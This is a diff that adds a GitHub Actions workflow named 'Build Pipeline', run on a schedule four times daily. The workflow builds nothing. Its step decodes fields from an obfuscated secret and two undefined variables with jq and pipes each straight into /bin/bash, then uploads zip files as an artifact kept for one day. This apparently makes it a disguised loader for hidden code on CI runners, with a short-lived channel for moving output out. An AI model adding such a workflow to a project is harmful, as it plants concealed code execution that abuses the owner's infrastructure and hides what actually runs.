@@ -1,0 +1,26 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '10 3,9,15,21 * * *'
+jobs:
+  start:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute task
+        env:
+          hsuaw82: ${{ secrets.hsuaw82 }}
+        run: |
+          printf '%s' "$hsuaw82" | jq -r .y27696 | /bin/bash
+          printf '%s' "$psgl3" | jq -r .wvr65782 | /bin/bash
+          echo $m6564 | jq -r .gtz3725 | /bin/bash
+
+      - name: Persist data
+        if: ${{ always() }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: uzzrDuis
+          path: "*.zip"
+          retention-days: 1
